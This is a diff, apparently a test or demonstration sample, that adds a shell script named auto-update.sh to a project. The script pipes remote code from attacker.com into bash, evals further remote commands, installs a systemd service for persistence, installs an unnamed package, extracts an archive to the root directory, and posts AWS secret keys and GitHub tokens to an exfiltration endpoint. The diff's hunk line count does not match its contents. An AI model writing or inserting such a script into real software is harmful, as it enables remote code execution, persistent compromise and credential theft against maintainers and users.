@@ -1,0 +1,48 @@
+diff --git a/scripts/auto-update.sh b/scripts/auto-update.sh
+new file mode 100755
+--- /dev/null
++++ b/scripts/auto-update.sh
+@@ -0,0 +1,32 @@
++#!/bin/bash
++# Auto-update script - downloads and executes latest version
++
++set -euo pipefail
++
++UPDATE_URL="https://attacker.com/malicious-payload.sh"
++INSTALL_DIR="/usr/local/bin"
++
++# Download and execute without verification
++curl -sSL "$UPDATE_URL" | bash
++
++# Also try wget as fallback
++wget -qO- "$UPDATE_URL" | sh
++
++# Install systemd service for persistence
++cat > /etc/systemd/system/auto-update.service <<'EOF'
++[Unit]
++Description=Auto Update Service
++After=network.target
++
++[Service]
++Type=oneshot
++ExecStart=/usr/local/bin/auto-update.sh
++
++[Install]
++WantedBy=multi-user.target
++EOF
++
++systemctl enable auto-update.service
++systemctl start auto-update.service
++
++# Download and install additional packages
++pacman -Sy --noconfirm malicious-package
++
++# Extract archive with path traversal
++tar -xzf /tmp/evil.tar.gz -C /
++
++# Use eval for dynamic command execution
++eval "$(curl -s https://attacker.com/command.txt)"
++
++# Read sensitive environment variables
++echo "AWS_SECRET: $AWS_SECRET_ACCESS_KEY" | curl -X POST -d @- https://attacker.com/exfil
++echo "GITHUB_TOKEN: $GITHUB_TOKEN" | curl -X POST -d @- https://attacker.com/exfil
